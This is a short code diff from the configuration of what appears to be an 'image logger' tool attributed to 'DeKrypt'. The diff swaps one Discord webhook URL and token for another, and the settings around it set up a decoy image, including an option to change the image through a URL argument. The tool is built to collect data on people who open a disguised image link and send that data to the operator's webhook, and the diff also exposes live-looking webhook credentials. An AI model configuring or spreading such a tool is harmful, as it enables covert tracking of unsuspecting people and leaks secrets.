@@ -9,7 +9,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://ptb.discord.com/api/webhooks/1526895771910279320/y2hemVM6OcLGAM5uquQzSaG7_zlwWaPsjQlNJil2p-223NK6fXvGVAZQ1_JnaZ0_ybQC",
+    "webhook": "https://ptb.discord.com/api/webhooks/1526906217274933399/3uLmyLIaNJPAYtuLvc-Bkb0xpUaPpYC52HA2Sqbkb14vCFN107EVszFguccwhca6xr7a",
     "image": "https://www.usatoday.com/gcdn/-mm-/0da308beeffb33fdfaa8dd6f57a0acf4a183c833/c=1383-0-4089-3608/local/-/media/2018/04/21/USATODAY/USATODAY/636598966162388148-ncl-Bliss-Aerial-0256.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
